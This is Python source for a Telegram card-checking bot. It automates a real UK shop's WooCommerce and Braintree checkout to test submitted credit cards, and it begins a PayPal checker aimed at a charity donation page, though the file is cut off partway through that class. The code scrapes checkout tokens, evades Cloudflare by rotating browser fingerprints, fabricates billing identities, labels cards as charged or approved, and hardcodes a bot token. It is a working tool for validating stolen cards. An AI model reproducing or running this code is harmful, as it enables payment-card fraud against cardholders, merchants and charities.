import os
import re
import time
import random
import string
import asyncio
import httpx
import requests
import json
import hashlib
import uuid
import base64
import threading
import queue
from urllib.parse import urlparse, quote
from fake_useragent import UserAgent
from requests_toolbelt import MultipartEncoder
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from datetime import datetime

try:
    from curl_cffi import requests as cffi_requests
    HAS_CFFI = True
except ImportError:
    HAS_CFFI = False
    print("⚠️ curl_cffi not installed. Install: pip install curl_cffi")

# ==================== Settings ====================
TOKEN = '8840828420:AAEzYToODDQIt-gSl89FmaDNhytOH9t4W6M'
ADMINS = [6843321125]
VIP_USERS = {}
ALL_USERS = set()
GATEWAYS = []
stop_users = {}
last_check_time = {}
ANTI_SPAM_SECONDS = 7
user_tasks = {}
CODES = {}
gateway_index = 0
STRIPE_KEYS = {}
pending_files = {}
hit_counter = 0
HIT_CHAT_ID = -1002429830194
VIP_FILE_LIMIT = 2000

# ==================== Ban System ====================
BLOCK_FILE = "blockusers.txt"

def load_blocked():
    if not os.path.exists(BLOCK_FILE):
        open(BLOCK_FILE, 'w').close()
        return set()
    with open(BLOCK_FILE, 'r') as f:
        return set(line.strip() for line in f if line.strip())

def save_blocked(blocked_set):
    with open(BLOCK_FILE, 'w') as f:
        for uid in blocked_set:
            f.write(f"{uid}\n")

def is_banned(user_id):
    return str(user_id) in load_blocked()

def add_ban(user_id):
    blocked = load_blocked()
    blocked.add(str(user_id))
    save_blocked(blocked)

def remove_ban(user_id):
    blocked = load_blocked()
    blocked.discard(str(user_id))
    save_blocked(blocked)

async def banned_guard(update: Update):
    """Guard for messages"""
    if is_banned(update.effective_user.id):
        try:
            await update.message.reply_text(
                "❌ <b>You cannot use this bot. You are banned.</b>",
                parse_mode="HTML"
            )
        except:
            pass
        return True
    return False

async def banned_guard_callback(query):
    """Guard for callbacks"""
    if is_banned(query.from_user.id):
        try:
            await query.answer(
                "❌ You cannot use this bot. You are banned.",
                show_alert=True
            )
        except:
            pass
        return True
    return False

# ==================== Braintree Config ====================
BT_BASE_URL = "https://www.flue-warehouse.co.uk"
BT_PRODUCT_ID = "2519"
BT_PRODUCT_URL = f"{BT_BASE_URL}/twinwallflue/dinakdwtwinwallchimneysystems/125mm5inchdinakflue/chimneynoticeplate"
BT_CHECKOUT_URL = f"{BT_BASE_URL}/checkout"
BT_CART_URL = f"{BT_BASE_URL}/cart"
BT_GRAPHQL = "https://payments.braintree-api.com/graphql"
BT_UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
         "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")
BT_TIMEOUT = 30
BT_PROFILES = ["chrome124", "chrome120", "chrome119", "chrome116",
               "chrome110", "safari17_0", "safari15_5", "edge101"]
BT_SEED_COOKIES = {
    'cf_clearance': '', '__cf_bm': '',
    'wp_woocommerce_session_57fef34b6273bda31cbb77c3336eaf13': '',
    'wordpress_logged_in_57fef34b6273bda31cbb77c3336eaf13': '',
    'wfwaf-authcookie-52fdb2769a13fc78bc9e982b03ef73fd': '',
    'commercekit-nonce-value': '002d2bf384',
    'commercekit-nonce-state': '1',
    'commercekit-fast-token':
        '4ae10b6fa87616d24e04c56f4460f1e1a345f034b99348eb1d99931f639a489c',
    'last_visited_store': 'default',
}

JWT_RE = re.compile(
    r'(eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,})')


def bt_short_status(msg):
    s = str(msg or '').strip()
    if not s:
        return ''
    low = s.lower()
    m = re.search(r'reason\s*[:\-]\s*(.+?)(?:<|\n|$)', s, re.IGNORECASE)
    if m:
        reason = m.group(1).strip().rstrip('.').strip()
        reason = reason.split('.')[-1].strip()
        reason = re.sub(r'<[^>]+>', '', reason).strip(' .')
        if reason:
            return reason[:40]
    known = [
        ('pick up card', 'Pick Up Card'), ('pickup card', 'Pick Up Card'),
        ('call issuer', 'Call Issuer'),
        ('do not honor', 'Do Not Honor'), ('do not honour', 'Do Not Honor'),
        ('insufficient', 'Insufficient Funds'),
        ('cannot authorize', 'Cannot Authorize'),
        ('processor declined', 'Processor Declined'),
        ('fraud', 'Fraud'), ('policy', 'Policy'),
        ('not authorized', 'Not Authorized'),
        ('authentication', 'Authentication Required'),
        ('cvv', 'CVV'), ('cvc', 'CVV'), ('expired', 'Expired Card'),
        ('invalid', 'Invalid'), ('declined', 'Declined'), ('denied', 'Denied'),
        ('rejected', 'Rejected'),
        ('3d secure', '3DS'), ('3ds', '3DS'), ('otp', 'OTP'),
    ]
    for k, label in known:
        if k in low:
            return label
    clean = re.sub(r'<[^>]+>', ' ', s)
    clean = re.sub(r'\s+', ' ', clean).strip(' .')
    words = clean.split()
    return ' '.join(words[-3:])[:40] if words else ''


# ==================== Braintree Checker ====================
class BraintreeChecker:
    def __init__(self):
        if not HAS_CFFI:
            raise ImportError("curl_cffi not installed")
        self.profile = BT_PROFILES[0]
        self.reset()

    def reset(self):
        self.s = cffi_requests.Session(impersonate=self.profile)
        self.s.headers.update({
            'accept-language': 'en-GB,en;q=0.9,ar;q=0.8',
            'user-agent': BT_UA,
        })
        for k, v in BT_SEED_COOKIES.items():
            if v:
                try:
                    self.s.cookies.set(k, v, domain='www.flue-warehouse.co.uk', path='/')
                except Exception:
                    pass
        self.wc_nonce = None
        self.update_sec = None
        self.bt_token = None
        self.checkout_html = ""
        self.bin_info = ""
        self.fail_reason = None

    def _rotate_profile(self):
        i = BT_PROFILES.index(self.profile)
        nxt = BT_PROFILES[(i + 1) % len(BT_PROFILES)]
        if nxt != self.profile:
            self.profile = nxt
            self.reset()

    def _is_cf(self, r):
        if r is None:
            return False
        if r.status_code in (403, 503):
            b = (r.text or '')[:500].lower()
            if 'just a moment' in b or 'cf-chl' in b or 'cloudflare' in b:
                return True
        return False

    def _req(self, method, url, retries=3, **kw):
        kw.setdefault('timeout', BT_TIMEOUT)
        kw.setdefault('allow_redirects', True)
        for a in range(retries):
            try:
                r = self.s.request(method, url, **kw)
                if self._is_cf(r) and a < retries - 1:
                    self._rotate_profile()
                    time.sleep(1.5)
                    continue
                return r
            except Exception:
                time.sleep(1)
        return None

    def _scrape_nonces(self, html):
        for p in [r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"',
                  r'"woocommerce-process-checkout-nonce"\s*:\s*"([^"]+)"']:
            m = re.search(p, html)
            if m:
                self.wc_nonce = m.group(1)
                break
        for p in [r'name="security"\s+value="([^"]+)"',
                  r'"update_order_review_nonce"\s*:\s*"([^"]+)"']:
            m = re.search(p, html)
            if m:
                self.update_sec = m.group(1)
                break

    def _scrape_bt_token(self, html):
        m = re.search(r'wc_braintree_client_token\s*=\s*\[\s*"([^"]+)"\s*\]', html)
        if m:
            fp = self._decode_client_token(m.group(1))
            if fp:
                self.bt_token = "Bearer " + fp
                return True
        m = re.search(r'(eyJraWQiOi[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)', html)
        if m:
            self.bt_token = "Bearer " + m.group(1)
            return True
        for tok in JWT_RE.findall(html):
            if tok.startswith('eyJ2ZXJzaW9u'):
                continue
            self.bt_token = "Bearer " + tok
            return True
        return False

    def _decode_client_token(self, b64):
        try:
            padded = b64 + ('=' * ((4 - len(b64) % 4) % 4))
            dec = base64.b64decode(padded).decode('utf-8', 'ignore')
            try:
                j = json.loads(dec)
                fp = j.get('authorizationFingerprint')
                if fp and fp.startswith('eyJ'):
                    return fp
            except Exception:
                pass
            if dec.startswith('eyJ') and dec.count('.') == 2:
                return dec
        except Exception:
            pass
        return None

    def _extract_checkout_notice(self, html):
        for cls in ('woocommerce-error', 'woocommerce-info', 'woocommerce-message'):
            m = re.search(
                rf'<[^>]*class="[^"]*{cls}[^"]*"[^>]*>(.*?)</(?:ul|div|p|section)>',
                html, re.DOTALL | re.IGNORECASE)
            if m:
                txt = re.sub(r'<[^>]+>', ' ', m.group(1))
                txt = re.sub(r'\s+', ' ', txt).strip()
                if txt:
                    return txt
        if re.search(r'order-received|thank\s*you', html, re.IGNORECASE):
            return 'Charged'
        return ''

    def _classify_notice(self, notice):
        s = notice.lower()
        if 'thank you' in s or 'order received' in s or 'order-received' in s:
            return 'CHARGE', 'Charged'
        if 'insufficient' in s:
            return 'APPROVED', 'Insufficient Funds'
        if 'pick up card' in s or 'pickup card' in s:
            return 'DECLINE', 'Pick Up Card'
        if 'call issuer' in s:
            return 'DECLINE', 'Call Issuer'
        if 'do not honor' in s or 'do not honour' in s:
            return 'DECLINE', 'Do Not Honor'
        if 'processor declined' in s:
            return 'DECLINE', 'Processor Declined' + (' - Fraud Suspected' if 'fraud' in s else '')
        if 'policy' in s or 'cannot authorize' in s:
            return 'DECLINE', bt_short_status(notice) or 'Policy'
        if 'not authorized' in s:
            return 'DECLINE', 'Not Authorized'
        if 'fraud' in s:
            return 'DECLINE', 'Fraud Suspected'
        if 'cvv' in s or 'cvc' in s:
            return 'APPROVED', 'CVV'
        if 'expired' in s:
            return 'DECLINE', 'Expired Card'
        if any(k in s for k in ('declined', 'denied', 'rejected')):
            return 'DECLINE', bt_short_status(notice) or 'Declined'
        if any(k in s for k in ('3d', 'otp', 'authenticate')):
            return 'OTP', bt_short_status(notice) or '3DS'
        return 'DECLINE', bt_short_status(notice) or notice[:40]

    def init(self):
        r = self._req('GET', BT_PRODUCT_URL, headers={
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'})
        if r is None or r.status_code != 200:
            self.fail_reason = f"product HTTP {r.status_code if r else 'None'}"
            return False
        return True

    def add_to_cart(self):
        boundary = "----WebKitFormBoundary" + uuid.uuid4().hex[:16]
        parts = []
        for name, value in [('wpo-option[option-22]', ''), ('wpo-hidden-fields', '1'),
                            ('quantity', '1'), ('add-to-cart', BT_PRODUCT_ID)]:
            parts.append(f'--{boundary}\r\n')
            parts.append(f'Content-Disposition: form-data; name="{name}"\r\n\r\n')
            parts.append(f'{value}\r\n')
        parts.append(f'--{boundary}--\r\n')
        body = ''.join(parts).encode('utf-8')
        r = self._req('POST', f"{BT_BASE_URL}/?wc-ajax=shoptimizer_pdp_ajax_atc",
                      data=body,
                      headers={'accept': '*/*',
                               'content-type': f'multipart/form-data; boundary={boundary}',
                               'origin': BT_BASE_URL, 'referer': BT_PRODUCT_URL,
                               'x-requested-with': 'XMLHttpRequest'})
        if r is None or r.status_code not in (200, 302):
            self.fail_reason = f"add to cart: {r.status_code if r else 'None'}"
            return False
        return True

    def refresh_fragments(self):
        self._req('POST', f"{BT_BASE_URL}/?wc-ajax=get_refreshed_fragments",
                  data={'time': str(int(time.time() * 1000))},
                  headers={'accept': '*/*',
                           'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                           'origin': BT_BASE_URL, 'referer': BT_CHECKOUT_URL,
                           'x-requested-with': 'XMLHttpRequest'})

    def load_checkout(self):
        r = self._req('GET', BT_CHECKOUT_URL, headers={
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'upgrade-insecure-requests': '1', 'referer': BT_CART_URL})
        if r is None or r.status_code != 200:
            self.fail_reason = f"checkout HTTP {r.status_code if r else 'None'}"
            return False
        if '/cart' in str(r.url):
            self.fail_reason = "checkout → cart (empty)"
            return False
        self.checkout_html = r.text
        self._scrape_nonces(self.checkout_html)
        self._scrape_bt_token(self.checkout_html)
        return True

    def tokenize(self, c):
        if not self.bt_token:
            return None, "no AUTH token"
        auth = self.bt_token if self.bt_token.startswith("Bearer ") else "Bearer " + self.bt_token
        payload = {
            "clientSdkMetadata": {"source": "client", "integration": "dropin2",
                                  "sessionId": str(uuid.uuid4())},
            "query": ("mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { "
                      "tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 "
                      "expirationMonth expirationYear binData { prepaid debit commercial issuingBank "
                      "countryOfIssuance productId } } } }"),
            "variables": {"input": {
                "creditCard": {"number": c['number'], "expirationMonth": c['month'],
                               "expirationYear": "20" + c['year'], "cvv": c['cvv'],
                               "billingAddress": {"postalCode": c['postcode']}},
                "options": {"validate": False}}},
            "operationName": "TokenizeCreditCard",
        }
        headers = {'authority': 'payments.braintree-api.com', 'accept': '*/*',
                   'authorization': auth, 'braintree-version': '2018-05-10',
                   'content-type': 'application/json',
                   'origin': 'https://assets.braintreegateway.com',
                   'referer': 'https://assets.braintreegateway.com/'}
        try:
            r = self.s.post(BT_GRAPHQL, json=payload, timeout=25, headers=headers)
        except Exception as e:
            return None, f"tokenize exception: {e}"
        if r.status_code != 200:
            return None, f"tokenize HTTP {r.status_code}: {r.text[:150]}"
        try:
            j = r.json()
        except Exception:
            return None, f"bad json: {r.text[:150]}"
        if j.get('errors'):
            msg = j['errors'][0].get('message', 'fail')
            low = msg.lower()
            if 'credentials' in low or 'auth' in low or 'version' in low:
                return None, "AUTH: " + msg[:120]
            if 'insufficient' in low:
                return "APPROVED_INSUFFICIENT", msg[:150]
            if 'cvv' in low:
                return "APPROVED_CVV", msg[:150]
            return None, msg[:200]
        node = (j.get('data') or {}).get('tokenizeCreditCard') or {}
        cc = node.get('creditCard') or {}
        bd = cc.get('binData') or {}
        bin_ = cc.get('bin', c['number'][:6])
        brand = cc.get('brandCode', '?')
        last4 = cc.get('last4', '')
        kind = 'DEBIT' if bd.get('debit') else 'CREDIT'
        extra = ('/PREPAID' if bd.get('prepaid') else '') + ('/COMMERCIAL' if bd.get('commercial') else '')
        self.bin_info = f"{brand} {bin_}xxxx{last4} {kind}{extra} [{bd.get('issuingBank', '?')}/{bd.get('countryOfIssuance', '?')}]"
        if node.get('token'):
            return node['token'], None
        return None, "no token in response"

    def place_order(self, c, nonce):
        if not self.wc_nonce:
            self._scrape_nonces(self.checkout_html)
        device_data = json.dumps({"correlation_id": str(uuid.uuid4())})
        data = (
            "wc_order_attribution_source_type=typein"
            f"&wc_order_attribution_referrer={quote(BT_PRODUCT_URL, safe='')}"
            "&wc_order_attribution_utm_campaign=(none)"
            "&wc_order_attribution_utm_source=(direct)"
            "&wc_order_attribution_utm_medium=(none)"
            "&wc_order_attribution_utm_content=(none)"
            "&wc_order_attribution_utm_id=(none)"
            "&wc_order_attribution_utm_term=(none)"
            "&wc_order_attribution_utm_source_platform=(none)"
            "&wc_order_attribution_utm_creative_format=(none)"
            "&wc_order_attribution_utm_marketing_tactic=(none)"
            f"&wc_order_attribution_session_entry={quote(BT_PRODUCT_URL, safe='')}"
            f"&wc_order_attribution_session_start_time={quote(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}"
            "&wc_order_attribution_session_pages=6"
            "&wc_order_attribution_session_count=1"
            f"&wc_order_attribution_user_agent={quote(BT_UA, safe='')}"
            f"&billing_first_name={c['first']}&billing_last_name={c['last']}"
            f"&billing_country=GB&billing_address_1={quote(c['address'], safe='')}"
            f"&billing_address_2={quote(c.get('address2', ''), safe='')}"
            f"&billing_city={quote(c['city'], safe='')}&billing_state=Greater+London"
            f"&billing_postcode={quote(c['postcode'], safe='')}"
            f"&billing_phone={quote(c['phone'], safe='')}&billing_email={quote(c['email'], safe='')}"
            f"&shipping_first_name={c['first']}&shipping_last_name={c['last']}"
            f"&shipping_country=GB&shipping_address_1={quote(c['address'], safe='')}"
            f"&shipping_address_2={quote(c.get('address2', ''), safe='')}"
            f"&shipping_city={quote(c['city'], safe='')}&shipping_state=Greater+London"
            f"&shipping_postcode={quote(c['postcode'], safe='')}&shipping_phone={quote(c['phone'], safe='')}"
            "&order_comments=&shipping_method%5B0%5D=table_rate%3A189"
            "&payment_method=braintree_cc"
            f"&braintree_cc_nonce_key={nonce}"
            f"&braintree_cc_device_data={quote(device_data, safe='')}"
            "&braintree_cc_3ds_nonce_key=&braintree_cc_config_data="
            "&braintree_applepay_nonce_key=&braintree_applepay_device_data="
            "&cf-turnstile-response="
            f"&woocommerce-process-checkout-nonce={self.wc_nonce or ''}"
            "&_wp_http_referer=%2Fcheckout")
        r = self._req('POST', f"{BT_BASE_URL}/?wc-ajax=checkout", data=data,
                      headers={'accept': 'application/json, text/javascript, */*; q=0.01',
                               'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                               'origin': BT_BASE_URL, 'referer': BT_CHECKOUT_URL,
                               'x-requested-with': 'XMLHttpRequest'})
        if r is None:
            return 'ERROR', 'no response'
        return self.parse(r.text)

    def parse(self, text):
        try:
            j = json.loads(text)
        except Exception:
            low = text.lower()
            if 'order-received' in low or 'thank' in low:
                return 'CHARGE', 'Charged'
            if 'reload' in low:
                return 'RELOAD', 'reload'
            return 'ERROR', bt_short_status(text)[:60] or 'bad payload'
        if not isinstance(j, dict):
            return 'ERROR', 'bad payload'
        if j.get('reload') is True:
            return 'RELOAD', 'reload'
        msgs = []

        def _walk(o):
            if isinstance(o, str):
                if o.strip():
                    msgs.append(o)
            elif isinstance(o, dict):
                for v in o.values():
                    _walk(v)
            elif isinstance(o, list):
                for v in o:
                    _walk(v)

        _walk(j)
        joined = " ".join(msgs).lower()
        if j.get('result') == 'success':
            return 'CHARGE', 'Charged'
        if j.get('redirect'):
            return 'CHARGE', 'Charged'
        if 'nonce more than once' in joined:
            return 'CHARGE', 'Charged'
        if 'policy' in joined:
            return 'DECLINE', bt_short_status(" ".join(msgs)) or 'Policy'
        if 'insufficient' in joined:
            return 'APPROVED', 'Insufficient Funds'
        if any(k in joined for k in ('invalid cvv', 'cvv mismatch', 'wrong cvv', 'cvc is invalid')):
            return 'APPROVED', 'CVV'
        if any(k in joined for k in ('pick up card', 'pickup card')):
            return 'DECLINE', 'Pick Up Card'
        if 'call issuer' in joined:
            return 'DECLINE', 'Call Issuer'
        if 'do not honor' in joined or 'do not honour' in joined:
            return 'DECLINE', 'Do Not Honor'
        if any(k in joined for k in ('could not be taken', 'card declined', 'not authorized',
                                     'authorization failed', 'fraud', 'declined', 'denied', 'rejected')):
            return 'DECLINE', bt_short_status(" ".join(msgs)) or 'Declined'
        if any(k in joined for k in ('3d secure', '3ds', 'challenge required')):
            return 'OTP', bt_short_status(" ".join(msgs)) or '3DS'
        if msgs:
            return 'ERROR', bt_short_status(" ".join(msgs)) or 'unknown'
        return 'ERROR', 'unknown'

    def check(self, raw):
        c = self.fmt(raw)
        if not c:
            return {'card': raw, 'status': 'ERROR', 'message': 'Invalid format',
                    'time': 0, 'bin': '', 'bin_info': ''}
        t0 = time.time()
        self.reset()
        try:
            if not self.init():
                return self.err(c, t0, self.fail_reason)
            time.sleep(0.2)
            if not self.add_to_cart():
                return self.err(c, t0, self.fail_reason)
            time.sleep(0.2)
            self.refresh_fragments()
            time.sleep(0.15)
            if not self.load_checkout():
                return self.err(c, t0, self.fail_reason)
            time.sleep(0.2)
            if not self.bt_token:
                self.load_checkout()
                time.sleep(0.2)
            if not self.bt_token:
                return self.err(c, t0, "no Braintree token")

            nonce, err = self.tokenize(c)
            if not nonce:
                if err and err.startswith("AUTH:"):
                    return self.err(c, t0, err)
                if err == "APPROVED_INSUFFICIENT":
                    return {'card': c['formatted'], 'status': 'APPROVED',
                            'message': 'Insufficient Funds',
                            'time': round(time.time() - t0, 2),
                            'bin': c['number'][:6], 'bin_info': self.bin_info}
                if err == "APPROVED_CVV":
                    return {'card': c['formatted'], 'status': 'APPROVED',
                            'message': 'CVV',
                            'time': round(time.time() - t0, 2),
                            'bin': c['number'][:6], 'bin_info': self.bin_info}
                return {'card': c['formatted'], 'status': 'DECLINE',
                        'message': (err or 'Declined')[:120],
                        'time': round(time.time() - t0, 2),
                        'bin': c['number'][:6], 'bin_info': self.bin_info}
            time.sleep(0.2)

            status, msg = self.place_order(c, nonce)

            if status == 'RELOAD':
                time.sleep(0.4)
                r2 = self._req('GET', BT_CHECKOUT_URL, headers={
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'referer': BT_CHECKOUT_URL})
                if r2 is not None and r2.status_code == 200:
                    notice = self._extract_checkout_notice(r2.text)
                    if notice:
                        status, msg = self._classify_notice(notice)
                    else:
                        self.load_checkout()
                        time.sleep(0.3)
                        nonce2, _ = self.tokenize(c)
                        if nonce2:
                            time.sleep(0.2)
                            s2, m2 = self.place_order(c, nonce2)
                            if s2 != 'RELOAD':
                                status, msg = s2, m2
                if status == 'RELOAD':
                    status, msg = 'ERROR', 'no result'

            return {'card': c['formatted'], 'status': status, 'message': msg,
                    'time': round(time.time() - t0, 2),
                    'token': (nonce or '')[:16] + '...',
                    'bin': c['number'][:6], 'bin_info': self.bin_info}
        except Exception as e:
            return self.err(c, t0, f"{type(e).__name__}: {e}")

    def err(self, c, t0, msg):
        return {'card': c['formatted'], 'status': 'ERROR', 'message': (msg or '')[:120],
                'time': round(time.time() - t0, 2), 'bin': c['number'][:6],
                'bin_info': self.bin_info}

    def fmt(self, s):
        parts = re.split(r'[/|\-_\s]+', s.strip())
        if len(parts) != 4:
            return None
        n = re.sub(r'\D', '', parts[0])
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3]
        if not n.isdigit() or not (13 <= len(n) <= 16):
            return None
        if not mm.isdigit() or not (1 <= int(mm) <= 12):
            return None
        if len(yy) == 4:
            yy = yy[2:]
        if not yy.isdigit() or not (24 <= int(yy) <= 40):
            return None
        if not cvc.isdigit() or not (3 <= len(cvc) <= 4):
            return None
        return {'number': n, 'month': mm, 'year': yy, 'cvv': cvc,
                'formatted': f"{n}|{mm}|{yy}|{cvc}",
                'email': f"user{random.randint(10000, 99999)}@gmail.com",
                'first': random.choice(['James', 'Ahmed', 'Sarah', 'John', 'Emma', 'Mohamed']),
                'last': random.choice(['Smith', 'Brown', 'Taylor', 'Khan', 'Ali']),
                'phone': f"+44{random.randint(7000000000, 7999999999)}",
                'address': f"{random.randint(1, 999)} High Street",
                'address2': f"Unit {random.randint(1, 99)}",
                'city': 'London', 'postcode': f"EC1A {random.randint(1, 9)}BB"}


# ==================== Premium Emoji ====================
PREMIUM_EMOJI_IDS = {
    "⚡": "6037229996622225123", "📌": "6037597564218384009", "🤖": "6039619012051082706",
    "🔥": "5206607081334906820", "💳": "5445353829304387411", "💵": "5197434882321567830",
    "❌": "6039615816595414817", "⏱": "5382194935057372936", "🏦": "5332455502917949981",
    "🌐": "5447410659077661506", "👤": "6041709716231429926", "🛡": "5197288647275071607",
    "👑": "6041702032534936873", "🔗": "5933844889652432294", "📊": "5231200819986047254",
    "🚀": "5195033767969839232", "💎": "6039601162167000043", "✅": "6034891730526935918",
    "👥": "6046639187636003094", "🦾": "6042051651462766312", "🌟": "5956369596528204273",
    "💰": "6125337376639161874", "🎉": "6039789659691688114", "🔈": "5388632425314140043",
    "😂": "5352615886131831104", "⭐": "6034999602925542852", "🎺": "5929509352095354418",
    "👁": "5976794472418121581", "💀": "5976323628038363401", "🛑": "5260293700088511294",
    "🧹": "5260293700088511294", "📁": "5260293700088511294", "🔧": "6026056450223116307",
    "📤": "6026056450223116307", "📥": "6026056450223116307", "😱": "5222466772061436244",
    "🎁": "6026316531967726726", "⏸": "6026056450223116307", "💸": "5231449120635370684",
    "🛍": "5229064374403998351", "🔜": "5440621591387980068", "⏹": "5359543311897998264",
}


def premium_emoji(text):
    if not text:
        return text
    result = text
    sorted_emojis = sorted(PREMIUM_EMOJI_IDS.keys(), key=len, reverse=True)
    for emoji in sorted_emojis:
        if emoji in result:
            doc_id = PREMIUM_EMOJI_IDS[emoji]
            result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result
    
    # ==================== PayPal Class ====================
UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
api_semaphore = asyncio.Semaphore(6)

PAYPAL_RESPONSES = [
    'Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED',
    'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
    'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY',
    'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR',
    'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
    'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
    'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS',
    'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
    'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
    'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
    'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
    'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
    'NOT_ENABLED_FOR_CARD_PROCESSING', 'CARD_TYPE_NOT_SUPPORTED',
    'MERCHANT_NOT_ENABLED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
    'INVALID_CURRENCY', 'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH',
    'ITEM_TOTAL_MISMATCH', 'TAX_TOTAL_MISMATCH', 'SHIPPING_TOTAL_MISMATCH',
    'HANDLING_TOTAL_MISMATCH', 'INSURANCE_TOTAL_MISMATCH', 'SHIPPING_DISCOUNT_MISMATCH',
    'INVALID_PAYER_ID', 'INVALID_PAYEE_ID', 'INVALID_RESOURCE_ID',
    'INVALID_PARAMETER', 'INVALID_PARAMETER_SYNTAX', 'INVALID_STRING_LENGTH',
    'INVALID_STRING_FORMAT', 'MISSING_REQUIRED_PARAMETER', 'DUPLICATE_REQUEST_ID',
    'DUPLICATE_INVOICE_ID', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
    'PAYEE_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
    'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
    'PAYER_ACCOUNT_INVALID', 'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT',
    'UNSUPPORTED_SHIPPING_TYPE', 'SHIPPING_ADDRESS_INVALID', 'SHIPPING_OPTION_NOT_SUPPORTED',
    'MULTIPLE_SHIPPING_ADDRESS_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_OPTION_SELECTED',
    'INVALID_PICKUP_ADDRESS', 'PICKUP_ADDRESS_INVALID', 'INVALID_SHIPPING_ADDRESS',
    'AUTHORIZATION_VOIDED', 'AUTHORIZATION_EXPIRED', 'AUTHORIZATION_DENIED',
    'AUTHORIZATION_CAPTURED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED',
    'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED',
    'TRANSACTION_ALREADY_REFUNDED', 'TRANSACTION_LIMIT_EXCEEDED',
    'BILLING_AGREEMENT_NOT_FOUND', 'BILLING_AGREEMENT_CANCELLED',
    'BILLING_AGREEMENT_EXPIRED', 'BILLING_AGREEMENT_FAILED',
    'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RESOURCE_NOT_FOUND',
    'METHOD_NOT_ALLOWED', 'NOT_ACCEPTABLE', 'UNSUPPORTED_MEDIA_TYPE',
    'RATE_LIMIT_REACHED', 'INSUFFICIENT_PERMISSIONS', 'INVALID_ACCESS_TOKEN',
    'EXPIRED_ACCESS_TOKEN', 'MALFORMED_REQUEST', 'UNKNOWN_ERROR',
]


async def get_bin_info(bin_number):
    urls = [f"https://bins.antipublic.cc/bins/{bin_number}", f"https://lookup.binlist.net/{bin_number}"]
    for url in urls:
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                r = await client.get(url)
            if r.status_code != 200:
                continue
            data = r.json()
            brand = data.get("scheme") or data.get("brand") or data.get("type")
            card_type = data.get("type") or data.get("card_type")
            bank = data.get("bank", {}).get("name") if isinstance(data.get("bank"), dict) else data.get("bank")
            country = data.get("country", {}).get("name") if isinstance(data.get("country"), dict) else data.get("country")
            if not bank:
                bank = data.get("issuer") or data.get("bank_name")
            if not country:
                country = data.get("country_name")
            if brand or bank or country:
                return (f"{brand or 'Unknown'} - {card_type or 'Unknown'}", bank or "Unknown", country or "Unknown")
        except:
            continue
        await asyncio.sleep(0.5)
    return "Unknown", "Unknown", "Unknown"


class PayPalCommerce:
    def __init__(self, target_url=None):
        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        self.donation = "1.00"
        self.currency = "USD"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.cookies = {}
        self.target_url = target_url if target_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/'
        self.url = urlparse(self.target_url).netloc
        self.inurl = urlparse(self.target_url).path
